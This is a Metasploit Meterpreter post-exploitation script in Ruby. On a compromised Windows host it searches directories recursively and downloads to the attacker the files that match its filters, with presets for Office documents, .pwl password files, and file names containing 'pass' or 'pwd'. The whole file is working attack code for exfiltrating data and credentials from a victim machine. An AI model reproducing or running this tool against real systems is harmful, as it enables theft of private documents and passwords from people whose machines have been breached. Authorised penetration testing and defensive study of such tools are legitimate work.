
## Meterpreter script that recursively search and download
## files matching a given pattern
## Provided by Nicob <nicob [at] nicob.net>

##                 ==   WARNING   ==
## As said by mmiller, this kind of script is slow and noisy :
## http://www.metasploit.com/archive/framework/msg01670.html
## However, it can sometimes save your ass ;-)
##                 ==   WARNING   ==

# Filters
$filters = {
	'office' => '\.(doc|docx|ppt|pptx|pps|xls|xlsx|mdb|od.)$',
	'win9x'  => '\.pwl$',
	'passwd' => '(pass|pwd)',
}

@@opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu." ]
)

def usage
	print_line "search_dwld -- recursively search for and download files matching a given pattern"
	print_line "USAGE: run search_dwld [base directory] [filter] [pattern]"
	print_line
	print_line "filter can be a defined pattern or 'free', in which case pattern must be given"
	print_line "Defined patterns:"
	print_line $filters.keys.sort.collect{|k| "\t#{k}"}.join("\n")
	print_line
	print_line "Examples:"
	print_line " run search_dwld"
	print_line "	=> recursively look for (MS|Open)Office in C:\\"
	print_line " run search_dwld %USERPROFILE% win9x"
	print_line "	=> recursively look for *.PWL files in the user home directory"
	print_line " run search_dwld E:\\\\ free '\.(jpg|png|gif)$'"
	print_line "	=> recursively look for pictures in the E: drive"
	print_line(@@opts.usage)
	raise Rex::Script::Completed
end

@@opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		usage
	end
}

def scan(path)
	begin
		dirs = client.fs.dir.foreach(path)
	rescue ::Rex::Post::Meterpreter::RequestError => e
		print_error("Error scanning #{path}: #{$!}")
		return
	end

	dirs.each {|x|
		next if x =~ /^(\.|\.\.)$/
		fullpath = path + '\\' + x

		if client.fs.file.stat(fullpath).directory?
			scan(fullpath)
		elsif fullpath =~ /#{$motif}/i
			# Replace ':' or '%' or '\' by '_'
			dst = fullpath.tr_s(":|\%|\\", "_")
			dst = Rex::FileUtils.clean_path(::Dir.tmpdir + ::File::Separator + dst)
			print_line("Downloading '#{fullpath}' to '#{dst}'")
			client.fs.file.download_file(dst, fullpath)
		end
	}
end

#check for proper Meterpreter Platform
def unsupported
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end


unsupported if client.platform !~ /win32|win64/i
# Get arguments
basedir = args[0] || "C:\\"
filter  = args[1] || "office"

# Set the regexp
if filter == 'free'
	if args[2].nil?
		raise RuntimeError.new("free filter requires pattern argument")
	end
	$motif = args[2]
else
	$motif = $filters[filter]
end

if $motif.nil?
	raise RuntimeError.new("Unrecognized filter")
end

# Search and download
scan(basedir)

